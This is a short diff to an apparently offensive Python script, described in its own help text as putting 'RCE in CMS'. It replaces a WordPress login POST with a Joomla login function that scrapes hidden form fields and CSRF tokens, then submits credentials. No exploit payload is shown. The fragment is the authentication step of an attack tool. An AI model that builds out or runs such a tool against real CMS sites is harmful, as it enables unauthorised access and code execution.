@@ -32,16 +32,23 @@ def getHiddenValues(url):
         print(f"Error: {url} Status code: {response.status_code}")
         return {}    
 
+
+def postLoginJoomla(user, password, url, hidden_values):
+    
     data = {
-        'log': user,
-        'pwd': password,
-        'wp-submit': 'Log+In',
-        'redirect_to': 'url/wp-admin.php',
-        'testcookie': '1'
-    }  
-    r = requests.post(url=urll, data=data)
-    text = r.text
-    print(r.text)
+        'username': user,
+        'password': password,
+        'Submit=': '',
+        'option': hidden_values.get('option', ''),
+        'task': hidden_values.get('task', ''),
+        'return': hidden_values.get('return', ''),
+        hidden_values.get('1', ''): '1'
+    }
+    
+    response = requests.post(url, data, allow_redirects=True)
+    print(f'[+] {data}')
+    print(f'[+] Status code: {response.status_code}')
+
 def main():
     parser = argparse.ArgumentParser(description='Jumbo loves to put some RCE in CMS')
 
